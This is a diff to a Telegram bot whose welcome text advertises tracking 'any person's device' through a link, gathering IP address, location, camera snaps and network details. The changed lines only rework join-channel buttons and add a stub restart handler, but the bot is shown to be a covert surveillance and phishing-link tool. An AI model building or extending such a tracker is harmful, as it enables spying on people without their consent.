@@ -87,14 +87,12 @@ if (msg.text == "/start") {
     }
 
     if (!isMemberOfAllChannels) {
-      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
+      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.\nAfter joining all channels Please click /start command`;
 
-const joinButtons =[
-    { text: `Join Channel`, url: `https://t.me/RenusHackingArmy`},
-   { text: `Join Channel`, url: `https://t.me/RenusBotsChannel`}], 
-  [{ text: `Joined`, callback_data: '/start' }
-  ];
-
+const joinButtons = [
+  [{ text: 'Join Channel', url: 'https://t.me/RenusHackingArmy' }],
+  [{ text: 'Join Channel', url: 'https://t.me/RenusBotsChannel' }]
+];
 
 const joinMarkup = {
   reply_markup: JSON.stringify({
@@ -133,6 +131,9 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
     createNew(callbackQuery.message.chat.id);
   } else if (callbackQuery.data === "terms") {
     aterms(callbackQuery.message.chat.id);
+  } else if (callbackQuery.data === 'joined') {
+    // Call the function that handles the /start command
+    handleStartCommand(callbackQuery.message.chat.id);
   }
 });
 
@@ -214,7 +215,11 @@ var m = {
   // Send the message to the user
   bot.sendMessage(chatId, message, m);
 }
-
+function handleStartCommand(chatId) {
+  // Code that you would normally run for the /start command
+  bot.sendMessage(chatId, "Welcome! The bot is now restarted and ready for your commands.");
+  // Add any other logic or initialization code that /start would typically run
+}
 
 app.get("/", (req, res) => {
 var ip;
